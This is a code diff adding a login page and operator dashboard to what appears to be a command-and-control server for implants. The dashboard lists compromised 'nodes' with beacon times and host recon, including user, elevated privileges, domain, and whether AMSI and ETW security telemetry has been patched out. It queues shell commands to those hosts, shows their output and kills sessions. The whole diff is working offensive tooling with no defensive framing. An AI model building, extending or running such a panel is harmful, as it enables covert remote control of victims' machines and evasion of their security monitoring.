-  if (!data.entries || !data.entries.length) { list.innerHTML = '<div style="padding:12px;color:var(--muted);font-size:11px">—</div>'; return; }
-  list.innerHTML = data.entries.slice().reverse().map(e =>
-    \`<div class="audit-entry"><span class="atime">\${esc(e.ts)}</span><span class="aact">\${esc(e.action)}</span> <span class="aip">\${esc(e.ip)}</span></div>\`
-  ).join('');
-}
+  // ── API ──
+  async function api(path, opts={}) {
+    const r = await fetch(path, {
+      headers: {'Content-Type':'application/json','X-Operator-Token':token},
+      ...opts
+    });
+    if (r.status === 401) { toast('SESSION EXPIRED', 'err'); setTimeout(logout, 1500); return null; }
+    return r;
+  }
+
+  function logout() {
+    sessionStorage.removeItem('ghost_token');
+    location.href = '/';
+  }
+  window.logout = logout;
+
+  // ── Sessions ──
+  async function refreshSessions() {
+    const r = await api('/sessions');
+    if (!r) return;
+    const sessions = await r.json();
+    const list = document.getElementById('session-list');
+    document.getElementById('hdr-count').textContent = sessions.length;
+    const pulse = document.getElementById('pulse');
+    const stxt = document.getElementById('status-txt');
+    if (sessions.length > 0) {
+      pulse.className = 'pulse live';
+      stxt.textContent = 'LIVE';
+    } else {
+      pulse.className = 'pulse';
+      stxt.textContent = 'IDLE';
+    }
+    if (!sessions.length) {
+      list.innerHTML = '<div class="no-sessions">NO ACTIVE NODES</div>';
+      return;
+    }
+    sessions.sort((a,b)=>new Date(b.last_beacon)-new Date(a.last_beacon));
+    list.innerHTML = sessions.map(s=>{
+      const idle = s.idle_seconds;
+      const stale = idle > 180;
+      const bc = s.pending_tasks>0?'tasks':stale?'stale':'live';
+      const bt = s.pending_tasks>0?(s.pending_tasks+' QUEUED'):stale?('STALE '+fmt(idle)):('LIVE '+fmt(idle));
+      return \`<div class="session-item\${s.session===selectedSid?' active':''}" onclick="selectSession('\${esc(s.session)}')">
+        <div class="sid">\${esc(s.session.slice(0,28))}\${s.session.length>28?'...':''}</div>
+        <div class="smeta">\${esc(s.remote_ip)} // \${esc(s.recon?.hostname||'unknown')}</div>
+        <div class="smeta">\${esc(s.recon?.user||'?')} \${s.recon?.elevated?'[ELEVATED]':''}</div>
+        <span class="sbadge \${bc}"><span class="sbadge-dot"></span>\${bt}</span>
+      </div>\`;
+    }).join('');
+  }
+  window.refreshSessions = refreshSessions;
+
+  // ── Select session ──
+  async function selectSession(sid) {
+    selectedSid = sid;
+    document.getElementById('sel-sid').textContent = sid;
+    document.getElementById('session-header').style.display = 'flex';
+    document.getElementById('empty-state').style.display = 'none';
+    document.getElementById('cmd-bar').style.display = 'block';
+    switchTab(currentTab);
+    await Promise.all([refreshSessions(), fetchResults(), fetchRecon()]);
+  }
+  window.selectSession = selectSession;
+
+  // ── Tabs ──
+  function switchTab(tab) {
+    currentTab = tab;
+    document.querySelectorAll('.tab').forEach(t=>t.classList.toggle('active',t.dataset.tab===tab));
+    const op = document.getElementById('output-pane');
+    const rp = document.getElementById('recon-pane');
+    if (selectedSid) {
+      op.style.display = tab==='output'?'flex':'none';
+      op.style.flexDirection = 'column';
+      rp.style.display = tab==='recon'?'block':'none';
+    }
+  }
+  window.switchTab = switchTab;
+
+  // ── Results ──
+  async function fetchResults() {
+    if (!selectedSid) return;
+    const r = await api('/results/'+encodeURIComponent(selectedSid));
+    if (!r) return;
+    const data = await r.json();
+    const box = document.getElementById('output-pane');
+    const tc = document.getElementById('tc-output');
+    const entries = data.results||[];
+    tc.textContent = entries.length;
+    if (!entries.length) {
+      box.innerHTML = '<div style="color:var(--muted);font-size:10px;letter-spacing:.1em;padding:16px;text-transform:uppercase">No output received</div>';
+      return;
+    }
+    box.innerHTML = entries.slice().reverse().map((e,i)=>
+      \`<div class="result-entry">
+        <div class="result-ts"><span class="ts-label">OUTPUT</span>\${esc(e.ts)}</div>
+        <div class="result-body">\${esc(e.output)}</div>
+      </div>\`
+    ).join('');
+  }
+  window.fetchResults = fetchResults;
+
+  // ── Recon ──
+  async function fetchRecon() {
+    if (!selectedSid) return;
+    const r = await api('/sessions');
+    if (!r) return;
+    const sessions = await r.json();
+    const s = sessions.find(x=>x.session===selectedSid);
+    if (!s) return;
+    const recon = s.recon||{};
+    // session header meta
+    const parts = [s.remote_ip, recon.hostname, recon.os].filter(Boolean);
+    document.getElementById('sel-meta').textContent = parts.join(' // ');
+    // recon pane
+    const cells = [
+      {k:'hostname',v:recon.hostname,cls:'hi'},
+      {k:'user',v:recon.user,cls:''},
+      {k:'elevated',v:recon.elevated?'YES':'NO',cls:recon.elevated?'danger':''},
+      {k:'remote ip',v:s.remote_ip,cls:''},
+      {k:'os',v:recon.os,cls:''},
+      {k:'build',v:recon.build,cls:''},
+      {k:'arch',v:recon.arch,cls:''},
+      {k:'domain',v:recon.domain,cls:''},
+      {k:'amsi patched',v:recon.amsi?'YES':'NO',cls:recon.amsi?'hi':'warn'},
+      {k:'etw patched',v:recon.etw?'YES':'NO',cls:recon.etw?'hi':'warn'},
+      {k:'first seen',v:s.first_seen,cls:''},
+      {k:'last beacon',v:s.last_beacon,cls:''},
+      {k:'pending tasks',v:s.pending_tasks,cls:s.pending_tasks>0?'warn':''},
+      {k:'results',v:s.result_count,cls:''},
+    ].filter(c=>c.v!=null&&c.v!=='');
+    document.getElementById('recon-pane').innerHTML =
+      '<div class="recon-grid">' +
+      cells.map(c=>\`<div class="recon-cell"><div class="recon-key">\${esc(c.k)}</div><div class="recon-val \${c.cls}">\${esc(String(c.v))}</div></div>\`).join('')+
+      '</div>';
+  }
+
+  // ── Send command ──
+  async function sendCmd(preset) {
+    if (!selectedSid) return toast('NO NODE SELECTED', 'err');
+    const input = document.getElementById('cmd-input');
+    const cmd = preset || input.value.trim();
+    if (!cmd) return;
+    const r = await api('/task', {method:'POST', body:JSON.stringify({session:selectedSid,cmd})});
+    if (!r) return;
+    const data = await r.json();
+    if (data.status==='queued') {
+      toast('QUEUED // DEPTH='+data.queue_depth);
+      if (!preset) input.value='';
+    } else {
+      toast('ERROR: '+JSON.stringify(data),'err');
+    }
+  }
+  window.sendCmd = sendCmd;
+
+  // ── Kill ──
+  async function killSession() {
+    if (!selectedSid || !confirm('Queue exit command for '+selectedSid+'?')) return;
+    const r = await api('/sessions/'+encodeURIComponent(selectedSid),{method:'DELETE'});
+    if (!r) return;
+    toast('EXIT QUEUED');
+    selectedSid = null;
+    document.getElementById('session-header').style.display = 'none';
+    document.getElementById('empty-state').style.display = 'flex';
+    document.getElementById('output-pane').style.display = 'none';
+    document.getElementById('recon-pane').style.display = 'none';
+    document.getElementById('cmd-bar').style.display = 'none';
+    await refreshSessions();
+  }
+  window.killSession = killSession;
+
+  // ── Audit ──
+  async function fetchAudit() {
+    const r = await api('/audit?limit=80');
+    if (!r) return;
+    const data = await r.json();
+    const list = document.getElementById('audit-list');
+    const entries = (data.entries||[]).slice().reverse();
+    if (!entries.length) { list.innerHTML = '<div class="no-sessions">NO ENTRIES</div>'; return; }
+    list.innerHTML = entries.map(e=>{
+      const t = e.ts.replace('T',' ').slice(0,19);
+      return \`<div class="audit-entry \${esc(e.action)}">
+        <div class="a-time">\${t}</div>
+        <div class="a-action">\${esc(e.action)}</div>
+        <div class="a-ip">\${esc(e.ip)}</div>
+      </div>\`;
+    }).join('');
+  }
+  window.fetchAudit = fetchAudit;
+
+  function fmt(s){return s<60?s+'s':s<3600?Math.floor(s/60)+'m':Math.floor(s/3600)+'h'}
+  function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
+
+  // ── Boot ──
+  refreshSessions();
+  fetchAudit();
+  pollTimer = setInterval(()=>{refreshSessions();if(selectedSid)fetchResults();},5000);
+  auditTimer = setInterval(fetchAudit,15000);
+})();
 </script>
 </body>
 </html>`;
+// ─── Auth Handler ─────────────────────────────────────────
+
+async function handleAuth(request: Request, env: Env): Promise<Response> {
+  const body = await safeJson<{u?: string; p?: string}>(request);
+  if (!body?.u || !body?.p) return errorResponse("Missing credentials", 400);
+  const validUser = env.DASHBOARD_USER || "";
+  const validPass = env.DASHBOARD_PASS || "";
+  if (!validUser || !validPass) return errorResponse("Auth not configured", 503);
+  if (!secureCompare(body.u, validUser) || !secureCompare(body.p, validPass)) {
+    return errorResponse("Invalid credentials", 401);
+  }
+  // Token = operator token — client stores it and uses as X-Operator-Token
+  return jsonResponse({ token: env.OPERATOR_TOKEN });
+}
 
 // ─── Router ───────────────────────────────────────────────
 
@@ -887,10 +1143,19 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
 
   // ── Web UI ────────────────────────────────────────────────
   if (path === "/" && method === "GET") {
+    return new Response(LOGIN_HTML, {
+      status: 200,
+      headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" },
+    });
+  }
+  if (path === "/dashboard" && method === "GET") {
     return new Response(DASHBOARD_HTML, {
       status: 200,
       headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" },
     });
+  }
+  if (path === "/auth" && method === "POST") {
+    return withCORS(await handleAuth(request, env), env);
   }
 
   // ── Public routes ──────────────────────────────────────
